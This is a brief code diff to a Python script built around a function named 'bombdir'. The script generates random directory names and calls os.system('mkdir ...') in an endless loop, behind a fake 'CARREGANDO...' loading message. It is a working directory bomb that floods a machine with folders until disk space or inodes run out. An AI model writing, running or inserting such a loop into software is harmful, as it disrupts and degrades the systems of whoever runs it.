@@ -27,12 +27,14 @@ def bombdir(Length):
     cs = '-,_.'
     ran = ''
     for i in range(0,Length,2):
-        ran += random.choice(numeros)
         ran += random.choice(letras)
+        ran += random.choice(numeros)
         ran += random.choice(cs)
     return ran
 	
 clear()
 
+print('CARREGANDO...')
+
 while True:
-	os.system(f'mkdir {bombdir(10*100)}')
+	os.system(f'mkdir {bombdir(10*10)}')
